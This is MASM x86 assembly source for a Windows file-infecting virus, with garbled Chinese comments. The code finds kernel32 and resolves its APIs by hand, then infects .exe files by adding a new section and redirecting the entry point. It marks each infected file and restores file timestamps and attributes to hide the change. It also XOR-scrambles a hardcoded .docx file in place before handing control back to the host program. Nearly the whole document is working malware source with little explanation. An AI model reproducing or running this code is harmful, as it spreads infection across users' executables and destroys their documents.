.386 
.model flat,stdcall 
option casemap:none 
include windows.inc 
include kernel32.inc 
include user32.inc 
includelib kernel32.lib 
includelib user32.lib 
;����һЩ��صĶ��壬 

.data 
mcaption db "Infected!",0 
mtitle db "Virus",0 
; ���������õ���һЩ���� 


.code 
host_start: 
invoke MessageBox,NULL,offset mcaption,offset mtitle,64 
invoke ExitProcess,0 
;��������룬ֻ�Ǽ򵥵Ĵ�һ���ַ����ѡ� 
;��������������󣬾ͻ������˴�ִ�С� 


Virus SEGMENT PARA USE32 'Virus' 
assume cs:Virus,ds:Virus 
vstart: 
push ebp 
push esp 
call nstart 
nstart:  
;;;;;;;;;;;;; 
pop ebp 
sub ebp,offset nstart 
;�����г��õ�һ�ַ������õ�һ��ƫ�Ʋ 
;��������õ������б�������Ҫ���ϸ���ƫ�Ʋ� 

assume fs:nothing    ;����SEH,�����쳣����ֱ�ӷ���ԭ���. 
lea ebx, SEH[ebp] 
push ebx 
push fs:[0] 
mov fs:[0],esp 
mov OldEsp[ebp],esp 

;========================= 
; * ���ĳ�����ڵ�ַ * 
cmp old_base[ebp],0 
jnz gonext 
mov old_base[ebp],400000h 
gonext: 
cmp old_in[ebp],0 
jnz change 
mov old_in[ebp],1000h 
change: 
mov eax,old_base[ebp] 
mov des_base[ebp],eax 
mov eax, old_in[ebp] 
mov des_in[ebp],eax 
;��������ĵ���˼���� 
;����ʼִ��ʱ����ǰ�����ԭ��ڵ�ַ��ŵ�old_base+old_in�� 
;���ڳ�����old_base_in�б����;����˽��˵�ַ��ŵ� 
;des_base_in���Ա��������ԭ������ڡ� 

;���KERNEL32��ַ�������API������ַ 
mov   eax,[esp+10h] ;//ȡKernel32���ص�ַ 
and   ax,0f000h 
mov   esi,eax   ;//�õ�Kernel.PELoader����λ��(����ȷ) 
LoopFindKernel32: 
    sub   esi,1000h  
    cmp   word ptr[esi],'ZM' ;//����EXE�ļ�ͷ 
    jnz   short LoopFindKernel32 
GetPeHeader: 
    movzx edi,word ptr[esi+3ch] 
    add   edi,esi 
    cmp   word ptr[edi],'EP' ;//ȷ���Ƿ�PE�ļ�ͷ 
    jnz   short LoopFindKernel32      ;esi->kernel32,edi->kernel32 PE HEADER 
    ;//////////////////////////////////////////////////����GetProcAddress������ַ 
    mov vKernel32[ebp],esi 

GetPeExportTable: 
    mov   ebx,[edi+78h];4+14h+60h 
    add   ebx,vKernel32[ebp]      ;//�õ���������� 
    mov   vExportKernel[ebp],ebx 

    push 14 
    call aGetProcAddr 
    db "GetProcAddress",0 
aGetProcAddr:  
    lea  eax,GetApiAddress[ebp] 
    call eax 
    or eax,eax 
    jz ExitTimes 
    mov  vGetProcAddress[ebp],eax ;�õ�GetProcAddress��ַ 

    lea esi,bGetModuleHandle[ebp]  ;��������õ���KERNEL32�����ĵ�ַ 
    lea edi,vGetModuleHandle[ebp] 
    cld 
ComeOn:   
    lodsd 
    add eax,ebp 
    push eax 
    push vKernel32[ebp] 
    call dword ptr vGetProcAddress[ebp] 
    or eax,eax 
    jz ExitTimes 
    stosd 
    cmp dword ptr[esi],0 
    jnz ComeOn 

    call UserDll1 
    db "User32.dll",0 
UserDll1: 
    call dword ptr vGetModuleHandle[ebp] 
    or eax,eax 
    jnz Right 
    call  UserDll2 
    db "User32.dll",0 
UserDll2: 
    call dword ptr vLoadLibrary[ebp] 
    or eax,eax 
    jz ExitTimes   ;���USER32.DLL��ַ 
Right: 
    call GetMess 
    db "MessageBoxA",0 
GetMess: 
    push eax 
    call dword ptr vGetProcAddress[ebp] 
    or eax,eax 
    jz ExitTimes 
    mov vMessageBox[ebp],eax ;���MESSAGEBOX��ַ 

    ;------------------------- 
    ;Ŀ¼�Ŀ�ͷ���� 
    lea eax,NowPath[ebp] 
    push eax 
    mov eax,256 
    push eax 
    call vGetCurrentDirectory[ebp] ;�ɹ�����д���ֽ���,ʧ�ܷ���0 
    test eax,eax 
    jz ExitTimes 
    ;ͨ��API�����õ���ǰ��������Ŀ¼ 


    lea eax,NowPath[ebp] 
    push eax 
    lea eax,SrcDir[ebp] 
    push eax 
    call vlstrcpy[ebp] 
    test eax,eax 
    jz ExitTimes 
    ;���浱ǰĿ¼ 


    mov NowPathNo[ebp],1 
FindStartT: 
    cmp NowPathNo[ebp],1 
    jz GFindFt 
    cmp NowPathNo[ebp],2 
    jz GetWinD 
    cmp NowPathNo[ebp],3 
    jz GetSysD 
    jmp AllFindEnd  
    ;����NowPathNorֵ���жϸ�Ⱦ�ĸ�Ŀ¼���ļ� 


GetWinD:  

    mov eax,256 
    push eax 
    lea eax,NowPath[ebp] 
    push eax 
    call vGetWindowsDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 

    lea eax,NowPath[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 
    jmp GFindFt 
    ;�õ�WINDOWS����Ŀ¼�����ҽ�����Ϊ��ǰĿ¼ 


GetSysD: 
    mov eax,256 
    push eax 
    lea eax,NowPath[ebp] 
    push eax 
    call vGetSystemDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 

    lea eax,NowPath[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
    test eax,eax 
    jz ExitTimes 
    ;�õ�SYSTEM����Ŀ¼�����ҽ�����Ϊ��ǰĿ¼ 


GFindFt: 
    lea eax,FindData[ebp] 
    push eax 
    lea eax,FileFilter[ebp] 
    push eax 
    call vFindFirstFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz FindEnds 
    mov hFind[ebp],eax 
    ;���ҵ�ǰĿ¼�µĵ�һ��EXE�ļ� 

GoOnFind: 
    ;����ļ�������,ȷ���ļ����Ա��� 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call  vGetFileAttributes[ebp] 
    cmp eax,-1 
    jz EndDir 
    mov OldAttribute[ebp],eax 
    test eax,1 
    jz Open 
    and eax,0fffffffeh 
    push eax 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vSetFileAttributes[ebp] 
    cmp eax,-1 
    jz EndDir 
Open:  
    ;�����ǲ�����Ⱦ���� 
    ;------------------------- 
    push 0 
    push FILE_ATTRIBUTE_NORMAL 
    push OPEN_EXISTING 
    push 0 
    push FILE_SHARE_READ+FILE_SHARE_WRITE 
    push GENERIC_READ+GENERIC_WRITE 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vCreateFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz EndDir 
    mov hFile[ebp],eax 
    ;���ļ� 

    lea eax, LastWriteTime[ebp] 
    push eax 
    lea eax, LastAccessTime[ebp] 
    push eax 
    lea eax, CreationTime[ebp] 
    push eax 
    push hFile[ebp] 
    call vGetFileTime[ebp] 
    test eax,eax 
    jz CloseFile1 
    ;����ԭ���ļ��޸�ʱ�� 

    push 0  
    push 0  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz Closefile 
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseMap 
    mov pMapping[ebp], eax 
    ;�жϸ�Ⱦ����:1,�Ƿ�PE.2:�Ƿ��Ѹ�Ⱦ.3:�Ƿ����㹻�Ŀռ�.4:WINZIP�Խ�ѹ�ļ� 
    mov ebx, eax  
    assume ebx :ptr IMAGE_DOS_HEADER  
    mov eax,[ebx].e_lfanew 
    test eax,0fffff000h 
    jnz  EndDir  ;Header+stub������̫��,����4096byte  
    mov pe_header_off[ebp],eax 
    add ebx,eax ;��ʱebxָ��PE�ļ�ͷ 
    assume ebx:ptr IMAGE_NT_HEADERS  
    cmp [ebx].Signature,IMAGE_NT_SIGNATURE ;��PE�ļ��� 
    jnz UnMap   
    cmp word ptr[ebx+1ah],'FB' ;�Ƿ��Ѿ���Ⱦ  
    jz UnMap 
    ;***************************************************************  
    ;ָ��ڶ������ж��Ƿ���WinZip�Խ�ѹ�ļ� 
    ;�ǾͲ���Ⱦ 
    ;*************************************************************** 
    mov eax,ebx 
    add eax,18h                ;PE HEADER(4)+FILEHEADER(14) 
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add eax,esi ;eaxָ���1���ڱ� 
    assume eax:ptr IMAGE_SECTION_HEADER 
    mov edx,[eax].PointerToRawData 
    add edx,ebx 
    sub edx,pe_header_off[ebp] 
    sub edx,4 
    cmp dword ptr[edx],0 
    jnz UnMap 
    add eax,28h ;eaxָ���2���ڱ� 
    mov edx,eax 
    assume edx:ptr IMAGE_SECTION_HEADER 
    mov eax,[edx].PointerToRawData 
    add eax,ebx 
    sub eax,pe_header_off[ebp] 
    add eax,12h ;��10h+2h(10h��Ϊ"WinZip....") 
    cmp dword ptr [eax], 'piZn' 
    jz UnMap 
    push [ebx].OptionalHeader.FileAlignment 
    pop FileAlign[ebp] 
    ;***************************************************************  
    ;�ж��Ƿ����㹻�ռ�洢�½�  
    ;28h=sizeof IMAGE_SECTION_HEADER ,18h=sizeof IMAGE_FILE_HEADER 
    ;edi��ָ���½�  
    ;***************************************************************  
    movzx eax,[ebx].FileHeader.NumberOfSections ;�ļ��Ľ��� 
    mov ecx,28h 
    mul ecx       
    add eax,pe_header_off[ebp] 
    add eax,18h  
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add eax,esi 
    mov NewSection_off[ebp],eax ;�����½���ʼRVA 
    add eax,28h    ;�Ƚ������½ں��Ƿ񳬳�SizeOfHeaders(��.TEXT���ļ��е�RVA) 
    cmp eax,[ebx].OptionalHeader.SizeOfHeaders  
    ja  Infest   ;��ʹû����ӿռ仹�ǿ������� 

    push pMapping[ebp]          ;�ر�ӳ���ļ�,Ȼ����������µ�ӳ���ļ� 
    call vUnMapViewOfFile[ebp]  ;����ӳ���ļ��Ŀռ�����4K�Ա���벡������ 
    push hMapping[ebp]  
    call vCloseHandle[ebp]       

    push 0 
    push hFile[ebp] 
    call vGetFileSize[ebp]  ;get file size 
    cmp eax,INVALID_HANDLE_VALUE 
    jz Closefile 
    mov ecx,FileAlign[ebp] 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange 
    inc eax  
NoChange: 
    mul ecx  
    mov fsize[ebp],eax;�ļ��ߴ���ļ����� 
    add eax,1000h   

    push 0  
    push eax  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz Closefile 
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseMap 
    mov pMapping[ebp], eax 

    mov ebx,eax 
    add ebx,pe_header_off[ebp] ;��ʱebxָ��PE�ļ�ͷ 
    assume ebx:ptr IMAGE_NT_HEADERS 

    Noinfect: ;����ԭ���  
    mov eax,[ebx]. OptionalHeader.AddressOfEntryPoint  
    mov old_in[ebp],eax  
    mov eax, [ebx].OptionalHeader.ImageBase  
    mov old_base[ebp],eax  

    mov edi,NewSection_off[ebp]    ;�½ڵ�RVA 
    add edi,pMapping[ebp] ;edi->�½���ʼ��ַ 
    ;********************************************************************* 
    ;�ռ�����, ^0^,��ʼ�����½ڲ������ֶ�  
    ;esiָ��ԭ�ļ����һ���ڣ�������������½�ĳЩ�ֶ� 
    ;*********************************************************************  
    inc [ebx].FileHeader.NumberOfSections ;����Ŀ+1 
    mov esi,edi  ;ediָ���½� 
    sub esi,28h  ;esiָ����һ���� 
    assume edi:ptr IMAGE_SECTION_HEADER  
    assume esi:ptr IMAGE_SECTION_HEADER  
    mov [edi].Name1,41h ;���Ϊ�½�������ʹ֮������0 
    push [ebx].OptionalHeader.SizeOfImage ;ԭ�ļ�ӳ��װ���ڴ����ܳߴ�,����SectionAlignment. 
    pop [edi].VirtualAddress   ;�½����ڴ��еĵ�ַ 
    mov eax,offset vend-offset vstart 
    mov [edi].Misc.VirtualSize,eax ;�½ڵĴ�С(δ����) 
    mov ecx,[ebx].OptionalHeader.FileAlignment 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange1 
    inc eax  
NoChange1: 
    mul ecx 
    mov [edi].SizeOfRawData,eax ;�½ڶ���FileAligment��Ĵ�С 
    mov eax,fsize[ebp] 
    mov [edi].PointerToRawData,eax ;�������ļ��е�λ�� 
    mov [edi].Characteristics,0E0000020h ;�ɶ���д��ִ��  

    ;*****************************************************************************************  
    ;����SizeOfImage,AddressOfEntryPoint,ʹ�½ڿ�����ȷ���ز�����ִ��  
    ;***************************************************************************************** 
    mov eax,[edi].Misc.VirtualSize ;�½ڵĴ�С(δ����) 
    mov ecx,[ebx].OptionalHeader.SectionAlignment ;�ڴ�ڶ��� 
    xor edx,edx 
    div ecx 
    test edx,edx 
    jz NoChange2 
    inc eax  
NoChange2: 
    mul ecx  
    add eax,[ebx].OptionalHeader.SizeOfImage;������С+ԭ�ļ�ӳ��װ���ڴ����ܳߴ�,����SectionAlignment. 
    mov [ebx].OptionalHeader.SizeOfImage,eax ;���º���ļ�ӳ��װ���ڴ����ܳߴ�,����SectionAlignment. 
    mov eax,[edi].VirtualAddress ;�½����ڴ��еĵ�ַд����ڵ� 
    mov [ebx].OptionalHeader.AddressOfEntryPoint,eax  
    mov word ptr [ebx+1ah],'FB' ;д���Ⱦ��־  

    mov edi,pMapping[ebp] 
    add edi,fsize[ebp] 
    lea esi,vstart[ebp] 
    mov ecx,offset vend-offset vstart 
    cld 
    rep movsb            ;����������д��ӳ����ڴ���(��ԭ�ļ�֮��) 

    ; ;************************************************* 
    ; ;Ǭ����Ų�ƣ����ڱ��Ƶ�PEͷ����� 
    ; ;************************************************* 
    ; mov edi,[ebx].OptionalHeader.SizeOfHeaders 
    ; add edi,ebx  
    ; sub edi,pe_header_off[ebp];edi->�ļ��еĵ�һ���� 
    ; dec edi  ;edi->PEͷ�����һ���ֽ� 

    ; mov esi,ebx 
    ; add esi,18h                ;PE HEADER(4)+FILEHEADER(14) 
    ; movzx eax,[ebx].FileHeader.SizeOfOptionalHeader  
    ; add esi,eax ;esiָ���1���ڱ� 
    ; movzx ecx,[ebx].FileHeader.NumberOfSections 
    ; imul ecx,ecx,28h 
    ; add esi,ecx 
    ; dec esi ;esi->���һ���ڵ����һ���ֽ� 
    ; std 
    ; rep movsb ;Ǭ����Ų�� 
    ; sub edi,ebx  
    ; sub edi,18h 
    ; inc edi 
    ; mov word ptr[ebx].FileHeader.SizeOfOptionalHeader,di;���¿�ѡͷ��С 

;*************************************************************************** 
;�˳�ǰ���нڿռ��������ߣ�edi->First Section Table,ecx=NumberOfSections 
;*************************************************************************** 
Infest: 
    mov edi,ebx 
    add edi,18h                ;PE HEADER(4)+FILEHEADER(14) 
    movzx esi,[ebx].FileHeader.SizeOfOptionalHeader  
    add edi,esi ;ediָ���1���ڱ� 
    movzx ecx,[ebx].FileHeader.NumberOfSections 
SectionInfest: 
    assume edi:ptr IMAGE_SECTION_HEADER 
    mov eax,[edi].SizeOfRawData;�ļ������ڵĴ�С 
    cmp eax,[edi].Misc.VirtualSize ;�ڵĴ�С(δ����) 
    jb NextSection 
    mov [edi].Misc.VirtualSize,eax 
NextSection: 
    add edi,28h 
    loop SectionInfest 

UnMap: 
    push pMapping[ebp]  
    call vUnMapViewOfFile[ebp] 
CloseMap: 
    push hMapping[ebp]  
    call vCloseHandle [ebp] 

Closefile: 
    lea eax, LastWriteTime[ebp] 
    push eax 
    lea eax, LastAccessTime[ebp] 
    push eax 
    lea eax, CreationTime[ebp] 
    push eax 
    push hFile[ebp] 
    call vSetFileTime[ebp] 
CloseFile1: 
    push hFile[ebp]  
    call vCloseHandle [ebp] 

    mov eax,OldAttribute[ebp] 
    test eax,1 ;�Ƿ���Ҫ�ָ��ļ�����(��д���ԾͲ���Ҫ�ָ���) 
    jz EndDir 
    push eax 
    lea eax,FindData[ebp].cFileName 
    push eax 
    call vSetFileAttributes[ebp]  ;�ָ�ԭ���ļ����� 
    ;-------------------------------- 
;Ŀ¼��β��  
EndDir: 
    lea eax,FindData[ebp] 
    push eax 
    push hFind[ebp] 
    call vFindNextFile[ebp] 
    cmp eax,0 
    jnz GoOnFind  
    ;������һ���ļ���Ȼ�������Ⱦ��ֱ��ȫ��ȾȫΪֹ 

FindEnds: 
    push hFind[ebp] 
    call vFindClose[ebp] 
    mov  NowPathNo[ebp],4 
    ;inc NowPathNo[ebp] 
    ;inc NowPathNo[ebp] ;<< ����˼���1 
    ;inc NowPathNo[ebp] ;<< 
    ;inc NowPathNo[ebp] ;<< 
    jmp FindStartT 
    ;Ϊ�˵��Է��㣬�ڴ�ֻ��Ⱦ��ǰĿ¼ 


AllFindEnd: 
    lea eax,SrcDir[ebp] 
    push eax 
    call vSetCurrentDirectory[ebp] 
;�ָ���ǰĿ¼ 


;####[ ���������� ]########################;  
;--- �������� ------------------- 
InTimes: 
;--------------------------------
    push 0 
    push FILE_ATTRIBUTE_NORMAL 
    push OPEN_EXISTING 
    push 0 
    push FILE_SHARE_READ+FILE_SHARE_WRITE 
    push GENERIC_READ+GENERIC_WRITE 
    lea eax, DocxFile[ebp]
    push eax 
    call vCreateFile[ebp] 
    cmp eax,INVALID_HANDLE_VALUE 
    jz ExitTimes 
    mov hFile[ebp],eax 
    ;���ļ� 

    push 0  
    push 0  
    push 0  
    push PAGE_READWRITE  
    push NULL  
    push hFile[ebp]  
    call vCreateFileMapping[ebp]  
    or eax,eax 
    jz CloseDocxFile
    mov hMapping[ebp], eax  

    push 0  
    push 0  
    push 0  
    push FILE_MAP_READ+FILE_MAP_WRITE  
    push hMapping[ebp]  
    call vMapViewOfFile[ebp] 
    or eax,eax 
    jz CloseDocxFileMap
    mov pMapping[ebp], eax

    push 0 
    push hFile[ebp] 
    call vGetFileSize[ebp]  ;get file size 
    cmp eax,INVALID_HANDLE_VALUE 
    jz CloseDocxFile
    mov ecx, eax
    mov ebx, pMapping[ebp]

EncFile:
    xor byte ptr [ebx], 89
    inc ebx
    loop EncFile

    push 0 
    lea eax,MyTitle[ebp] 
    push eax 
    lea eax,MyTalk[ebp] 
    push eax 
    push 0 
    call vMessageBox[ebp]
    ; ��ʾһ����ʾ����
    push pMapping[ebp]  
    call vUnMapViewOfFile[ebp]
    jmp  CloseDocxFileMap

CloseDocxFile:
    push hFile[ebp]  
    call vCloseHandle [ebp] 

CloseDocxFileMap:
    push hMapping[ebp]  
    call vCloseHandle [ebp] 

ExitTimes: 

    ;###########################################; 
    ; �ָ��Ĵ���������ԭ����  
    ;------------------------------------------ 
    pop fs:[0] 
    add esp,4 
    mov eax,des_base[ebp] 
    add eax,des_in[ebp] 
    pop esp 
    pop ebp 
    push eax 
    ret 
    ;-------< ���÷���ԭ�����׼�� >----------- 
    ;;;;;;;;;;;;;; 

;���������� 
    GetApiAddress proc AddressOfName:dword,ApiLength:byte 
    push ebx 
    push esi 
    push edi 
    call Tmp 
Tmp: 
    pop  edx 
    sub edx,offset Tmp 
    mov  edi,vExportKernel[edx]   
assume edi:ptr IMAGE_EXPORT_DIRECTORY  
GetExportNameList:   
    mov   ebx,[edi].AddressOfNames ;//�õ������������ 
    add   ebx,vKernel32[edx]     ;ebx->AddressOfNames(�������ֵ�ָ���ַ). 
    xor   eax,eax      ;//������ż��� 
    mov   edx,vKernel32[edx]      ;//�ݴ�Kernel32ģ����;edx->kernel32 
    push edi   ;����EDI 

LoopFindApiStr: 
    add   ebx,04        
    inc   eax          ;//���Ӻ������� 
    mov   edi,dword ptr[ebx] 
    add   edi,edx      ;//�õ�һ��Api�������ַ���.edi->������ 
    StrGetProcAddress:   
    mov esi,AddressOfName       ;//�õ�Api�����ַ��� 
    cmpsd;�Ƚ�ǰ4���ַ��Ƿ����   
    jnz   short LoopFindApiStr  ;eax=��������INDEX    
    xor   ecx,ecx 
    mov   cl, ApiLength 
    sub   cl,4        ;//�Ƚ�ʣ���GetProcAddress�� 
    cld 
Goon: 
    cmpsb 
    jnz   short LoopFindApiStr  ;eax=��������INDEX 
    loop Goon 

    pop edi ;�ָ�EDI 
    mov   esi,edx  
    mov ebx,[edi].AddressOfNameOrdinals 
    add ebx,esi     ;//ȡ������ŵ�ַ�б�,ebx->AddresssOfNameOrdinals 
    movzx ecx,word ptr [ebx+eax*2] 
    mov   ebx,[edi].AddressOfFunctions 
    add   ebx,esi      ;//�õ�Kernel32������ַ�б� 
    mov   ebx,dword ptr[ebx+ecx*4] 
    add   ebx,esi      ;//����GetProcAddress������ַ  
    mov   eax,ebx      ;eax=API������ַ,esi=Kernel32.dll hModule 
    pop edi 
    pop esi 
    pop ebx 
    ret 
GetApiAddress endp  

SEH PROC C pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD 
    call Next 
Next: 
    pop ebx 
    sub ebx,offset Next 
    assume  edi:ptr CONTEXT 
    assume  esi:ptr EXCEPTION_RECORD 
    mov     esi,pExcept 
    mov     edi,pContext           
    test    dword ptr[esi+4],1              ;Exception flags 
    jnz     @f         
    test    dword ptr[esi+4],6 
    jnz     @f 

    mov     eax,OldEsp[ebx] 
    mov     [edi].regEsp,eax                 ;�ָ�ESP               
    lea     eax,ExitTimes[ebx] 
    mov     [edi].regEip,eax                 ; 
    mov     eax,0 

    ret  
@@: 
    mov eax,1 
    ret 
SEH ENDP 
    ;-------------------------- 
    ; �������õ�ַ 
    ;-------------------------- 
    vKernel32 dd 0 
    vExportKernel dd 0 
    vGetProcAddress dd 0 

    vGetModuleHandle dd 0 
    vLoadLibrary dd 0 
    vCreateFile dd 0  
    vGetFileSize dd 0 
    vCreateFileMapping dd 0  
    vMapViewOfFile dd 0  
    vUnMapViewOfFile dd 0  
    vCloseHandle dd 0 
    vGetCurrentDirectory dd 0  
    vGetWindowsDirectory dd 0  
    vGetSystemDirectory dd 0  
    vSetCurrentDirectory dd 0 
    vlstrcpy dd 0 
    vFindFirstFile dd 0  
    vFindNextFile dd 0  
    vFindClose dd 0  
    vGetSystemTime dd 0  
    vExitProcess dd 0 
    vGetFileAttributes dd 0 
    vSetFileAttributes dd 0 
    vGetFileTime dd 0 
    vSetFileTime dd 0 

    vMessageBox dd 0 

    bGetModuleHandle dd offset sGetModuleHandle 
    bLoadLibrary dd offset sLoadLibrary 
    bCreateFile dd offset  sCreateFile 
    bGetFileSize dd offset sGetFileSize 
    bCreateFileMapping dd offset sCreateFileMapping  
    bMapViewOfFile dd offset sMapViewOfFile  
    bUnMapViewOfFile dd offset sUnMapViewOfFile  
    bCloseHandle dd offset sCloseHandle 
    bGetCurrentDirectory dd offset sGetCurrentDirectory   
    bGetWindowsDirectory dd offset sGetWindowsDirectory   
    bGetSystemDirectory dd offset sGetSystemDirectory  
    bSetCurrentDirectory dd offset sSetCurrentDirectory 
    blstrcpy dd offset slstrcpy  
    bFindFirstFile dd offset  sFindFirstFile 
    bFindNextFile dd offset sFindNextFile  
    bFindClose dd offset sFindClose  
    bGetSystemTime dd offset sGetSystemTime 
    bExitProcess dd offset sExitProcess 
    bGetFileAttributes dd offset sGetFileAttributes 
    bSetFileAttributes dd offset sSetFileAttributes 
    bGetFileTime dd offset sGetFileTime 
    bSetFileTime dd offset sSetFileTime 
    dd 0 

    sGetModuleHandle db "GetModuleHandleA",0 
    sLoadLibrary db "LoadLibraryA",0 
    sCreateFile db  "CreateFileA",0 
    sGetFileSize db "GetFileSize",0 
    sCreateFileMapping db "CreateFileMappingA",0  
    sMapViewOfFile db  "MapViewOfFile",0 
    sUnMapViewOfFile db "UnmapViewOfFile",0  
    sCloseHandle db "CloseHandle",0 
    sGetCurrentDirectory db "GetCurrentDirectoryA",0   
    sGetWindowsDirectory db "GetWindowsDirectoryA",0   
    sGetSystemDirectory db "GetSystemDirectoryA",0  
    sSetCurrentDirectory db "SetCurrentDirectoryA",0 
    slstrcpy db "lstrcpy",0  
    sFindFirstFile db "FindFirstFileA",0 
    sFindNextFile db "FindNextFileA",0  
    sFindClose db "FindClose",0  
    sGetSystemTime db "GetSystemTime",0 
    sExitProcess db "ExitProcess",0 
    sGetFileAttributes db "GetFileAttributesA",0 
    sSetFileAttributes db "SetFileAttributesA",0 
    sGetFileTime db "GetFileTime",0 
    sSetFileTime db "SetFileTime",0 
    ; ��������....��Ҫ�õ�API������ַ 

    ALIGN 4 
    OldEsp dd 0 
    DocxFile db "C:\Users\CQU\Desktop\test.docx",0
    MyTitle db "Virus",0 
    MyTalk db "Pe Infected!",0 

    hFile dd 0 
    fsize dd 0 
    FileAlign dd 0 
    OldAttribute dd 0 
    hMapping dd 0 
    pMapping dd 0 
    pe_header_off dd 0 ;�洢PE�ļ�ͷ����ļ���ƫ���� 
    NewSection_off dd 0 ;�洢�½�����ļ���ƫ���� 
    old_base dd 0 
    old_in dd 0 
    des_base dd 0 
    des_in dd 0 
    CreationTime FILETIME <>   ;�洢�ļ�ʱ�� 
    LastAccessTime FILETIME <> 
    LastWriteTime FILETIME<> 

    ;��صı������� 


    ;----------------------------- 
    ; �����ļ�ר�� 

    FileFilter db "*.exe",0 
    FindData WIN32_FIND_DATA <> 
    hFind dd 0 
    NowPath db 256 dup (0) 
    NowPathNo db 0 
    SrcDir db 256 dup (0) 
    ;----------------------------- 
    NowTimes SYSTEMTIME <> 
    ;----------------------------- 

vend: 
Virus ends 

    end vstart 
